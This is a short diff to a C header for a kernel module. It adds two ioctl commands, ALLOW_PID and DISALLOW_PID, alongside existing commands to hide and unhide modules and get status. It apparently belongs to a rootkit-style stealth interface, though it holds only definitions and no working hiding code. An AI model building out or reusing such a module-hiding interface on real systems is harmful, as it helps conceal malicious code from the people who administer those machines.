@@ -32,5 +32,7 @@ struct kernmod_status_request {
 #define IOCTL_HIDE_MODULE   _IOW(IOCTL_MAGIC, 4, char[MAX_HIDDEN_NAME])
 #define IOCTL_UNHIDE_MODULE _IOW(IOCTL_MAGIC, 5, char[MAX_HIDDEN_NAME])
 #define IOCTL_GET_STATUS    _IOWR(IOCTL_MAGIC, 6, struct kernmod_status_request)
+#define IOCTL_ALLOW_PID     _IOW(IOCTL_MAGIC, 7, char[MAX_PID_STR])
+#define IOCTL_DISALLOW_PID  _IOW(IOCTL_MAGIC, 8, char[MAX_PID_STR])
 
 #endif
